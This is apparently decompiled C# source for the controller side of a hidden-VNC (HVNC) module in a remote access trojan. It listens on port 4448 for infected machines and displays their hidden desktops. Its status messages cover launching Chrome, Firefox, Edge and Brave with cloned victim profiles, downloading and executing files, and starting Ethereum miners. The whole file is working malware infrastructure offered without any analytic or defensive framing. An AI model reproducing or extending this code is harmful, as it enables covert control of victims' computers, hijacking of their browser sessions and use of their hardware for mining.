using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Server.Connection;
using Server.Forms;

namespace Server;

internal class HVNCListener
{
	public static int HVNC_PORT = 4448;

	public static List<TcpClient> _clientList = new List<TcpClient>();

	public static TcpListener _TcpListener;

	private static Clients main_client = null;

	public static Random random = new Random();

	public static void SetAllowIp(Clients _cl)
	{
		main_client = _cl;
	}

	public void Start()
	{
		Thread thread = new Thread(Listenning);
		thread.IsBackground = true;
		thread.Start();
	}

	public static void ShowHVNC(TcpClient client)
	{
		Program.mainform.Invoke((MethodInvoker)delegate
		{
			FrmVNC frmVNC = new FrmVNC
			{
				client = client,
				main_client = main_client
			};
			frmVNC.Name = "VNCForm:" + Conversions.ToString(client.GetHashCode());
			string text = client.Client.RemoteEndPoint.ToString().Split(':')[0];
			frmVNC.Text = "HVNC from [" + text + "]";
			frmVNC.Show();
		});
	}

	private void Listenning()
	{
		try
		{
			_clientList = new List<TcpClient>();
			_TcpListener = new TcpListener(IPAddress.Any, HVNC_PORT);
			_TcpListener.Start();
			_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
		}
		catch (Exception)
		{
		}
	}

	public static string RandomNumber(int length)
	{
		return new string((from s in Enumerable.Repeat("0123456789", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	private void ResultAsync(IAsyncResult iasyncResult_0)
	{
		try
		{
			TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
			tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
			_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
		}
		catch (Exception)
		{
		}
	}

	private void ReadResult(IAsyncResult iasyncResult_0)
	{
		TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
		string text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
		if (main_client == null || text != main_client.Ip)
		{
			if (_clientList.Contains(tcpClient))
			{
				_clientList.Remove(tcpClient);
			}
			tcpClient.Close();
			tcpClient.Dispose();
			return;
		}
		checked
		{
			try
			{
				BinaryFormatter binaryFormatter = new BinaryFormatter();
				binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
				binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
				binaryFormatter.FilterLevel = TypeFilterLevel.Full;
				byte[] array = new byte[8];
				int num = 8;
				int num2 = 0;
				while (num > 0)
				{
					int num3 = tcpClient.GetStream().Read(array, num2, num);
					num -= num3;
					num2 += num3;
				}
				ulong num4 = BitConverter.ToUInt64(array, 0);
				int num5 = 0;
				byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
				using (MemoryStream memoryStream = new MemoryStream())
				{
					int num6 = 0;
					int num7 = array2.Length;
					while (num7 > 0)
					{
						num5 = tcpClient.GetStream().Read(array2, num6, num7);
						num7 -= num5;
						num6 += num5;
					}
					memoryStream.Write(array2, 0, (int)num4);
					memoryStream.Position = 0L;
					object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
					if (objectValue is string)
					{
						string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
						try
						{
							if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
							{
								_clientList.Add(tcpClient);
								ShowHVNC(tcpClient);
							}
							else if (_clientList.Contains(tcpClient))
							{
								GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
							}
							else
							{
								tcpClient.Close();
							}
						}
						catch (Exception)
						{
						}
					}
					else if (_clientList.Contains(tcpClient))
					{
						GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
					}
					else
					{
						tcpClient.Close();
					}
					memoryStream.Close();
					memoryStream.Dispose();
				}
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
			}
			catch (Exception ex2)
			{
				if (!ex2.Message.Contains("disposed") && _clientList.Contains(tcpClient))
				{
					lock (_clientList)
					{
						try
						{
							int index = _clientList.IndexOf(tcpClient);
							_clientList.RemoveAt(index);
						}
						catch (Exception)
						{
						}
					}
				}
				tcpClient.Close();
			}
		}
	}

	public static void HandleHVNCData(string object_2, FrmVNC frm)
	{
		if (frm != null && object_2 != null)
		{
			string[] array = object_2.Split('|');
			string obj = array[0];
			if (obj.Equals("0"))
			{
				frm.VNCBoxe.Tag = new Size(Convert.ToInt32(array[1]), Convert.ToInt32(array[2]));
			}
			if (obj.Equals("200"))
			{
				frm._LabelStatus.Text = "Chrome successfully started with clone profile !";
			}
			if (obj.Equals("201"))
			{
				frm._LabelStatus.Text = "Chrome successfully started !";
			}
			if (obj.Equals("202"))
			{
				frm._LabelStatus.Text = "Firefox successfully started with clone profile !";
			}
			if (obj.Equals("203"))
			{
				frm._LabelStatus.Text = "Firefox successfully started !";
			}
			if (obj.Equals("204"))
			{
				frm._LabelStatus.Text = "Edge successfully started with clone profile !";
			}
			if (obj.Equals("205"))
			{
				frm._LabelStatus.Text = "Edge successfully started !";
			}
			if (obj.Equals("206"))
			{
				frm._LabelStatus.Text = "Brave successfully started with clone profile !";
			}
			if (obj.Equals("207"))
			{
				frm._LabelStatus.Text = "Brave successfully started !";
			}
			if (obj.Equals("256"))
			{
				frm._LabelStatus.Text = "Downloaded successfully ! | Executed...";
			}
			if (obj.Equals("222"))
			{
				frm._LabelStatus.Text = "ETH miner successfully started !";
			}
			if (obj.Equals("223"))
			{
				frm._LabelStatus.Text = "ETC miner successfully started !";
			}
			if (obj.Equals("22"))
			{
				frm.total_size = Convert.ToInt32(array[1]);
				frm.DuplicateProgess.Position = Convert.ToInt32(array[1]);
			}
			if (obj.Equals("23"))
			{
				frm.DuplicateProfile(Convert.ToInt32(array[1]));
			}
			if (obj.Equals("24"))
			{
				frm._LabelStatus.Text = "Clone successfully !";
			}
			if (obj.Equals("25"))
			{
				frm._LabelStatus.Text = array[1];
			}
			if (obj.Equals("26"))
			{
				frm._LabelStatus.Text = array[1];
			}
			if (obj.Equals("9"))
			{
				Clipboard.SetText(array[1]);
			}
		}
	}

	public void GetStatus(object object_2, TcpClient tcpClient_0)
	{
		int hashCode = tcpClient_0.GetHashCode();
		FrmVNC frmVNC = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
		if (object_2 is Bitmap)
		{
			frmVNC.VNCBoxe.Image = (Image)object_2;
		}
		else if (object_2 is string)
		{
			HandleHVNCData((string)object_2, frmVNC);
		}
	}
}
